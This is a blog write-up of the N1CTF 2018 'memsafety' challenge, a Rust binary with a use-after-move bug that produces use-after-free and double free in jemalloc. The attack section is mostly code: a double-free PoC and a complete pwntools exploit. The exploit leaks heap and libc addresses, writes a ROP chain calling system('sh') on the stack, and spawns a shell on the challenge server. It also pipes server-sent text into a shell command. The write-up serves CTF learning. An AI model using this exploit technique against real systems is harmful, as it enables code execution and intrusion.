---
title: "N1CTF-2018 memsafety Writeup"
date: 2018-03-13
categories:
- N1CTF
- N1CTF-2018
- writeup
tags:
- N1CTF
- N1CTF-2018
- writeup
keywords:
- N1CTF
- N1CTF-2018
- writeup
autoThumbnailImage: false
thumbnailImagePosition: "top"
thumbnailImage: https://www.vectorlogo.zone/logos/rust-lang/rust-lang-card.png
coverImage: //d1u9biwaxjngwg.cloudfront.net/welcome-to-tranquilpeak/city.jpg

metaAlignment: center
---
<!--more-->
# N1CTF 2018 memsafety writeup

## Overview
This is actually a quite interesting challenge for it uses my favorite `Rust`!

After unzipping, there is a binary along with a `.rs` file and a libc.

```
distrib/
├── libc.so.6
├── main
└── main.rs
```

Let's go through the [source code it provided](https://github.com/Team-Eur3kA/n1ctf-2018/blob/master/source/pwn/memsafety/src/main.rs). It is a "calculator" that is able to accept some commands.

There is 3 kinds of commands, a number, a string or a vector. Vector is in a form like a python list.A global object is there to provide the ability to save the operated number, string or vector. Since we have the source, the logic is not hard to be clear.

Where is the bug? I searched keyword "unsafe" on my instinct, since it is related to what is unsafe in `Rust` compiled binary, unfortunately, there is none. This confuses me when there is no such unsafe part, how can it be unsafe? I try to compile my own binary to instrument some `println!()` to print some information. That's when things are getting better.

When I try to compile it using my `1.26 nightly rustc`, I get following result:
```
error[E0382]: use of moved value: `resvec`
   --> main.rs:942:45
    |
864 |                             } else if resvec.unwrap().len() <= 100 {
    |                                       ------ value moved here
...
942 |                                 let mut k = resvec.unwrap();
    |                                             ^^^^^^ value used here after move
    |
    = note: move occurs because `resvec` has type `std::option::Option<std::vec::Vec<i32>>`, which does not implement the `Copy` trait

error: aborting due to previous error

If you want more information on this error, try using "rustc --explain E0382"
```

One uses `Rust` a lot is surely familiar with this bug. Let's stop a little while to understand what the hell is the `moved value`.

## Rust Ownership 101
Ownership is a very important feature in `Rust` language. It is the core to `Rust` memory safety property. So we now know why the challenge is called `memsafety`.

In `Rust` language, a "variable definition" is not actually called that way, it is called "binding". So when we "define" a variable, we are actually "binding" a name to that value.
```Rust
let variable = 20; // This is a variable called "variable" binding to value 20
let variable = 30; // This is not "re-definition" in other language. Just the very same name binds to another value 30
```
When we bind a name to a value, this name "owns" the value. By owning, I mean that it is the owner. What if the owner runs out of scope? Well, it drops!

The "assign" in `Rust` is not like normal "assign", it also consists of the ownership transition.
```Rust
let variable = 20; // "variable" now owns 20
let owner_now = variable; // "assign", which should be called "move", the "owner_now" is the owner
println!("{}", variable); // XXX This won't compile, since the variable is not the owner now, so we can't use the variable to refer to the value
```

If you are familiar with `C++`, this is much like the "move" in `C++ 11`(or 14?).
What we really need to know, is that there is a lifetime of a binding. When the lifetime is out, it will be collected. That is one aspect how `Rust` achieves `zero-cost abstraction`.

## Back to our problem
According to the error message before, we know the problem is like we moved a value somewhere, while we are still using it. Think of something? Yup, UAF.

Since a value is moved elsewhere, when that value goes out of scope, it will be collected, but that value is still usable, UAF is very obvious in this way. The "`Copy` trait" in the "note" part of the error message shows that it is no copiable, which means it will not be copied, this ensures the vulnerability.

## Jemalloc problem
By analyze a little bit, we are sure it uses the default `jemalloc` allocator. I don't know much about this allocator, but my leader @Atum tells me that I can't change the meta-data like we used to do with libc malloc. So how can we use this UAF problem? I wrote a PoC to know that how double free is handled, to our surprise, a mature allocator like this just allows it!
```Rust
#![feature(allocator_api)]
#![feature(alloc)]
extern crate alloc;

use alloc::heap::*;

fn main() {
    let layout = Layout::from_size_align(0x100, 8).unwrap();
    let new_layout = Layout::from_size_align(0x104, 8).unwrap();
    let mut heap = Heap::default();
    unsafe {
        let a = heap.alloc(layout.clone()).unwrap();
        println!("{:?}", a);
        heap.dealloc(a, layout.clone());
        heap.dealloc(a, layout.clone());
        let a = heap.alloc(layout.clone()).unwrap();
        println!("{:?}", a);
        let a = heap.realloc(a, layout.clone(), new_layout).unwrap();
        println!("{:?}", a);
        let a = heap.alloc(layout.clone()).unwrap();
        println!("{:?}", a);
    }
}
```
The output is:
```
0x7f3ed7815100
0x7f3ed7815100
0x7f3ed782b000
0x7f3ed7815100
```

Now we have a thought. We use double free to control some pointer then get a read or write any where.

## Global helps
But where to control? Well, we need to find somewhere with a pointer on heap. The final decision is the global. The global has a vector of vector(`Vec<Vec<i32>>`), so it has to contain a pointer. The source of the vector can be found [here](https://doc.rust-lang.org/1.20.0/src/alloc/vec.rs.html#11-2598), since the type is `Vec<Vec<i32>>`, when we control the outer vector, the inner vector will be allocated on heap, and we can see the full struct there. So we are able to control the pointer and the length.

Now, the problem is how can we make this to be allocated to where we double freed before, how long will this struct be? A vector structure is 24 bytes long, this can be ensured using runtime debugging methods. Since this global vector can only be extended using `.push()` method, we need to know how and when it is allocated. By digging a little bit in IDA, we can see that the allocation strategy is that when the space is not enough to hold a new appending object, it doubles it. The discovering of this is left for readers to accomplish.

The first allocation of the vector is defined in the `new()` part of `Global`, it uses `with_capacity(10)` to allocate space for 10 possible elements. When it get doubled, the sizes can be 20 * 24, 40 * 24, 80 * 24 and so on.

## Exploit strategy
Final strategy to exploit:
1. use double free bug to get 2 freed regions for later use
2. push vector of different size to global vector, to make it double, then allocate the space where we freed before
3. allocate a large vector of the same size as before, now this will be allocated at the same position of the global vector
4. when we operates on the large vector in step 3, we are actually modifying global vector. Now we get read or write anywhere.
5. use that to leak heap address, and leak some libc address on heap, then leak `environ` variable in libc to get stack address, finally write to stack to form a ROP chain. 
6. exit! ROP chain will then be triggered

## Final exploit
```Python
from pwn import *
import os
context(os='linux', arch='amd64', log_level='debug')

DEBUG = False

libc = ELF('./libc.so.6')

if DEBUG:
    p = process('./main', env={'LD_PRELOAD': os.getcwd() + '/libc.so.6'})
else:
    p = remote('47.98.57.30', 4279)
    p.recvuntil('PoW:')
    line = p.recvline()
    output = subprocess.check_output(line, shell=True)
    p.sendline(output)
# libc at heap: 15220

def read_to_vec(idx, idy, idz):
    p.recvuntil('$')
    p.sendline('9')
    p.recvuntil('Index =>')
    p.sendline(str(idx))
    p.recvuntil('Index =>')
    p.sendline(str(idy))
    p.recvuntil('Index =>')
    p.sendline(str(idz))
    
def set_to_global(idx, num):
    p.sendline('7')
    p.recvuntil('Index =>')
    p.sendline(str(idx))
    p.recvuntil('Value =>')
    p.sendline(str(num & 0xffffffff))

def dump_result(idx):
    p.sendline('6')
    p.recvuntil('number')
    p.sendline(str(idx))
    p.recvuntil('Result:')
    result = int(p.recvline().strip('\n'))
    return result

def set_var(var):
    p.recvuntil('$')
    p.sendline('6')
    p.sendline(str(var))

def write_num_to_offset(offset, num):
    set_var(num)
    p.recvuntil('$')
    p.sendline('5')
    p.recvuntil('$')
    p.sendline('9')
    p.recvuntil('Index => ')
    p.sendline(str(0))
    p.recvuntil('Index => ')
    p.sendline(str(offset))


def dump_addr(addr):
    set_to_global(0, addr & 0xffffffff)
    set_to_global(1, addr >> 32)
    
    read_to_vec(0, 0, 6)
    read_to_vec(0, 1, 7)

    low = dump_result(6) & 0xffffffff
    high = dump_result(7) & 0xffffffff
    addr = low + (high << 32)
    return addr



def main():
    if DEBUG:
        raw_input()
    p.recvuntil('>>>')
    p.sendline('[' + '1, ' * 119 + '1]')
    p.recvuntil('$')
    p.sendline('0')
    p.recvuntil('(y/n): ')
    p.sendline('n')
    
    p.recvuntil('>>>')
    p.sendline('[1, 1]')
    for i in range(10):
        log.info('allocating %d' % i)
        p.recvuntil('$')
        p.sendline('4')
    p.sendline('0')
    p.recvuntil('(y/n): ')
    p.sendline('n')

    #p.recvuntil('>>>')
    #p.sendline('"' + 'a' * 110 + '"')
    #p.sendline('0')
    #p.recvuntil('(y/n): ')
    #p.sendline('y')

    p.recvuntil('>>>')
    p.sendline('[' + '1, ' * 119 + '1]')
    p.recvuntil('$')
    p.sendline('5')

    # get heap address
    p.sendline('6')
    p.recvuntil('number:')
    p.sendline('0')
    p.recvuntil('Result:')
    heap_address_low = int(p.recvline().strip('\n'))

    p.sendline('6')
    p.recvuntil('number:')
    p.sendline('1')
    p.recvuntil('Result:')
    heap_address_high = int(p.recvline().strip('\n'))
    heap_address = heap_address_low + (heap_address_high << 32)
    p.info('heap: ' + hex(heap_address))
    if DEBUG:
        heap_base = heap_address - 0x1f040
    else:
        heap_base = heap_address - 0x14040
    p.info('heap base %x' % heap_base)
    libc_at_heap = heap_base + 0x15220

    #set_to_global(0, libc_at_heap)

    libc_address = dump_addr(libc_at_heap)
    libc_base = libc_address - 0x3c3260
    
    p.info('libc base %x' % libc_base)

    environ_at_libc = libc.symbols['environ'] + libc_base
    p.info('environ at libc %x' % environ_at_libc)
    environ_addr = dump_addr(environ_at_libc)
    
    p.info('environ @ %x' % environ_addr)

    ret_addr = environ_addr - 0x2b0
    sh_addr = libc_base + list(libc.search('sh\x00'))[0]
    pop_rdi = 0x0000000000021102 + libc_base
    system_addr = libc_base + libc.symbols['system']
    
    p.info('writing ret_addr %x' % ret_addr)
    set_to_global(0, ret_addr & 0xffffffff)
    set_to_global(1, ret_addr >> 32)
    # size
    set_to_global(2, 0x10)
    set_to_global(4, 0x10)
    
    p.sendline('0')
    p.recvuntil('(y/n):')
    p.sendline('n')

    p.sendline(str(0x13337))

    p.info('written pop rdi %x @ %x' % (pop_rdi, ret_addr))
    write_num_to_offset(0, pop_rdi & 0xffffffff)
    write_num_to_offset(1, pop_rdi >> 32)

    p.info('written sh_addr %x @ %x' % (sh_addr, ret_addr + 0x8))
    write_num_to_offset(2, sh_addr & 0xffffffff)
    write_num_to_offset(3, sh_addr >> 32)

    p.info('written system_addr %x @ %x' % (system_addr, ret_addr + 0x10))
    write_num_to_offset(4, system_addr & 0xffffffff)
    write_num_to_offset(5, system_addr >> 32)

    p.sendline('0')
    p.recvuntil('(y/n):')
    p.sendline('n')
    p.recvuntil('>>>')
    p.sendline('exit')

    p.interactive()

if __name__ == '__main__':
    main()
```

## Conclusion
`Rust` is a good language! Learn it and use it insted of `C++`, you will not regret. The community of `Rust` is quite active, even uses RFCs to carefully design this beautiful language.

The bug in this challenge is actually a compiler bug in `rustc 1.14`, it is astonishing how the writer of this challenge discovers and uses it. Will it be further bug in `Rust` compiler so it may lead to exploitation? We may never know.
